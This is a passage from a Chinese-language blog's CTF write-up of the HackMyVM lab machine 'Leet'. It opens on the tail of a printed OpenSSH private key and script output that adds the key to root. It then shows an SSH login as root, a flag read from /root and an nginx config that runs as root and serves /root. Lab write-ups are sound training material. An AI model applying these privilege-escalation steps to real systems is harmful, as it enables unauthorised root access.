YxnY0/GZQv+YRUrD2jCDQUMQQm9hDwzpxbC3b\nqzFlXSUN8sUPCSdVFMEM3VBtHLdViigHtaAzIEo28sjPb5/4nRpGdrRKulSElYgO0xAAAA\nwCHRG5kmrZ763r+JVdTZSWNO4538H1VAC6zlEginstxDVicUnNNtvUsmaHnlY4Ogcwb6o7\na2UsV9hgLFPeKG8+1NLDniPBVkYR8Z+u6426ZE4JfOEpeJJM385davnzDo1ymUemnNPaII\n2Sqr5wJ8R+Jo3nORAqO/j3yNY7sUNy22FQ+qFdP2yKGHvUnfwKDCx1zVGIihMxKxIm6hJL\nw2b2/WBvkPcVoIPhDl1IACfsWgq5YxNFhXmIsV2Wf4iHkQ9gAAAMEA6+TJLDWuZ8Kpw38J\nGRLqWuuEGC1k9YLasnvo5wWndRW9XmpDoNixyRjGCrKeEPyM/9mc7mL7gXIuFPCblGR74t\nqMgbNjF+mBDQ4+YR4PFWHGIfTCu2KqDrUiDSljEcX3Hf8blaX8RqPbWu0OyBDH5VtooRCI\nq27BpN8wNcHUQPWMlvCulB60O11gxe7eq386/HqfThkeznIPS9k0DWwwjVDnz32lYMlTYf\nQj81015IaVC37dInVqnxhJW/tw+lSpAAAAwQC7ySK3nwYyKV/MjT0hk+jTRnqku5AZTeKt\nLpGBd3/kyRskoUIvekwb/5AOAPepO3B8HrXQf55zQj7jVz+LPdl9HJYvTTdtWyWmAfyq5N\nqnuGyRMA2BZJreOcUtJNJvsGPlEpOxNFyOyVXgcYS1KXsd3aOuPJVf9cFxtKsj27VfMaON\npkBC+aZcrFiNMzJ4wYiVvVVRw/mY0S06n46dqM2norvC6G98mBlNVxIWDpmp9QSDp9zNYN\nxee0ifeP9RzvEAAAANcml2YUBsZWV0LmhtdgECAwQFBg==\n-----END OPENSSH PRIVATE KEY-----\n[+] Add key to root user...\n[+] Use the SSH key to get access\n</span></code></pre>\n<pre><code class=\"hljs language-bash\">riva@leet:~$ ssh root@127.0.0.1\nThe authenticity of host <span class=\"hljs-string\">'127.0.0.1 (127.0.0.1)'</span> can<span class=\"hljs-string\">'t be established.\nED25519 key fingerprint is SHA256:V0kY0pxHYgYYJeQXQGSoUclaPX71KqkFTnqjTNaj/Qk.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '</span>127.0.0.1<span class=\"hljs-string\">' (ED25519) to the list of known hosts.\nLinux leet.hmv 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Tue May 28 17:37:49 2024 from 192.168.0.178\nroot@leet:~#\n</span></code></pre>\n<pre><code class=\"hljs language-bash\">root@leet:~# <span class=\"hljs-built_in\">ls</span>\nindex.html  r007_fl46.7x7  troll.jpg\n</code></pre>\n<pre><code class=\"hljs language-bash\">root@leet:~# <span class=\"hljs-built_in\">cat</span> r007_fl46.7x7 \nca169772acb099a02ebab8da1d9070ea\n</code></pre>\n<h2>题外话</h2>\n<p><code>troll.jpg</code>：</p>\n<p><img src=\"/post-images/HackMyVMLeet/image9.png\" alt=\"image.png\"></p>\n<p><code>root</code> 家目录下还存在 <code>index.html</code></p>\n<pre><code class=\"hljs language-bash\">root@leet:~# <span class=\"hljs-built_in\">cat</span> index.html \n&#x3C;!DOCTYPE html>\n&#x3C;html lang=<span class=\"hljs-string\">\"fr\"</span>>\n&#x3C;<span class=\"hljs-built_in\">head</span>>\n    &#x3C;meta charset=<span class=\"hljs-string\">\"UTF-8\"</span>>\n    &#x3C;meta name=<span class=\"hljs-string\">\"viewport\"</span> content=<span class=\"hljs-string\">\"width=device-width, initial-scale=1.0\"</span>>\n    &#x3C;title>Image centrée&#x3C;/title>\n&#x3C;/head>\n&#x3C;body>\n    &#x3C;div style=<span class=\"hljs-string\">\"text-align: center;\"</span>>\n        &#x3C;img src=<span class=\"hljs-string\">\"/root/troll.jpg\"</span> alt=<span class=\"hljs-string\">\"Troll\"</span>>\n    &#x3C;/div>\n&#x3C;/body>\n&#x3C;/html>\n</code></pre>\n<p>……</p>\n<p>一种方案（雾）就是让服务目录在 <code>/root</code> 中打开（应该很多人都是想这样做）</p>\n<pre><code class=\"hljs language-bash\">user root;\n\nevents {\n    worker_connections 1024;  <span class=\"hljs-comment\"># 设置每个 worker 的最大连接数</span>\n}\n\nhttp {\n    server {\n        listen 8088;\n        server_name example.com;\n        \n        <span class=\"hljs-comment\"># 设置根目录</span>\n        root /root;\n        index index.html index.htm;\n\n        location / {\n            try_files <span class=\"hljs-variable\">$uri</span> <span class=\"hljs-variable\">$uri</span>/ =404;\n        }\n    }\n}\n</code></pre>\n<p>然后就是 <code>LOL</code> 突脸，实际上……(我也不知道为什么)</p>\n<p><img src=\"/post-images/HackMyVMLeet/image10.png\" alt=\"image.png\"></p>","title":"HackMyVM - Leet","date":"2025-04-21","updated":"2025-04-21","comments":true,"tags":["Linux靶机","HackMyVM","Nginx","Micro","Werkzeug"],"categories":"靶机","description":"Leet. https://hackmyvm.eu/machines/machine.php?vm=Leet Notes：Enjoy it. 前期踩点 Web 渗透 信息收集 7777 是 web 端口 看样子是一个 Leet 转换器：Leet，又称黑客语，是指一种发源于西方国家的BBS、在线游戏和..."},"recentPosts":[{"id":"TheHackersLabsLavaShop","title":"TheHackersLabs - LavaShop","date":"2025-10-20","isEncrypted":false,"year":"2025","month":"10","day":"20"},{"id":"HackMyVMBirdeye","title":"HackMyVM - Birdeye","date":"2025-10-17","isEncrypted":false,"year":"2025","month":"10","day":"17"},{"id":"HackTheBoxSeason8 - Signed","title":"HackTheBox - Season9 - Signed","date":"2025-10-14","isEncrypted":true,"year":"2025","month":"10","day":"14"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Machine - TombWatcher","date":"2025-06-08","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason8 - Certificate","title":"HackTheBox - Machine - Certificate","date":"2025-06-02","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason9 - Imagery","title":"HackTheBox - Season9 - Imagery","date":"2025-10-04","isEncrypted":true,"year":"2025","month":"10","day":"04"},{"id":"TheHackersLabsTortuga","title":"TheHackersLabs - Tortuga","date":"2025-10-01","isEncrypted":false,"year":"2025","month":"10","day":"01"}]},"__N_SSG":true}